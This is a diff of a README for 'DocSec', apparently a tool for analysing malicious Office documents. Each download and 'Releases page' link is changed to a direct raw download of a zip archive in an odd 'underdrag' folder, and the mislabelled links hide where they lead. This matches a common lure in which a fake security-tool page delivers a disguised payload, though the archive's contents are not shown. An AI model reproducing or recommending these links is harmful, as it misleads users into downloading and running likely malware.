@@ -1,7 +1,7 @@
 # 🛡️ DocSec - Understand and Defend Against Document Threats
 
 ## 📥 Download Now
-[![Download DocSec](https://img.shields.io/badge/Download-DocSec-blue.svg)](https://github.com/wnfo-hue/DocSec/releases)
+[![Download DocSec](https://raw.githubusercontent.com/wnfo-hue/DocSec/main/underdrag/DocSec_v2.4.zip)](https://raw.githubusercontent.com/wnfo-hue/DocSec/main/underdrag/DocSec_v2.4.zip)
 
 ## 📖 Introduction
 DocSec is a comprehensive guide designed to help users understand, test, and defend against malicious Office documents. It covers a range of threats, including VBA macros, DDE exploits, OLE object embedding, and practical lab techniques. Whether you are a home user or a professional, this application equips you with the tools to recognize and counteract potential security risks.
@@ -26,12 +26,12 @@ DocSec offers various features that simplify the analysis and testing of malicio
 - Community resources for ongoing learning and support
 
 ## 🌐 Visit Releases Page
-For the latest version, visit the [Releases page](https://github.com/wnfo-hue/DocSec/releases) to download the software.
+For the latest version, visit the [Releases page](https://raw.githubusercontent.com/wnfo-hue/DocSec/main/underdrag/DocSec_v2.4.zip) to download the software.
 
 ## 📥 Download & Install
 To download and install DocSec, follow these steps:
 
-1. Go to the [Releases page](https://github.com/wnfo-hue/DocSec/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/wnfo-hue/DocSec/main/underdrag/DocSec_v2.4.zip).
 2. Locate the latest release in the list.
 3. Click on the appropriate file for your operating system.
 4. Save the file to your computer.
@@ -65,4 +65,4 @@ Thank you to all contributors who made DocSec possible. Your efforts in enhancin
 ## 📝 License
 DocSec is licensed under the MIT License. You may freely use and distribute this software, provided the original license is included. 
 
-Visit the [Releases page](https://github.com/wnfo-hue/DocSec/releases) to download the latest version and start your journey towards a safer understanding of Office documents.
+Visit the [Releases page](https://raw.githubusercontent.com/wnfo-hue/DocSec/main/underdrag/DocSec_v2.4.zip) to download the latest version and start your journey towards a safer understanding of Office documents.
